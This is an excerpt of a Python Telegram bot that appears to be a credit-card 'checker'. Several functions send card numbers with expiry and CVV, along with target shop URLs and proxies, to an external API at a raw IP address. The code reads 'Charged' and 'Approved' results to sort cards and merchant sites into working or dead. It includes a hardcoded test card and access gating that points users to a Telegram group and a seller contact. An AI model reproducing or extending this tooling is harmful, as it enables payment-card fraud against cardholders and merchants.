...
async def check_card_random_site(card, sites, user_id=None):
    ...
    try:
        ...
        url = f'http://108.165.12.183:8081/?{card}&url={selected_site}'
        if proxy_str:
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                ...
                # Remove USD or other currency if present in Price string for formatting
                ...
                charged = str(response_json.get('Charged', 'False')).lower() == 'true'
                approved = str(response_json.get('Approved', 'False')).lower() == 'true'
...
async def check_card_specific_site(card, site, user_id=None):
    ...
    try:
        ...
        # Build API URL with new endpoint
        url = f'http://108.165.12.183:8081/?{card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
...
async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        ...
        url = f'http://108.165.12.183:8081/?{test_card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                ...
                if charged or approved:
                    status = "working"
                else:
                    status = "dead"
                
                return {"status": status, "response": response_msg, "site": site, "price": price}
    except Exception as e: 
...
def access_denied_message_with_button():
    ...
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+nxCmq8lCNjNlYjZl")]]
...
async def sh(event):
    ...
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+nxCmq8lCNjNlYjZl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @pipin_o", buttons=buttons)
...
async def check_sites(event):
    ...
    if not can_access:
        buttons = [
            [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+nxCmq8lCNjNlYjZl")]
        ]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @pipin_o", buttons=buttons)
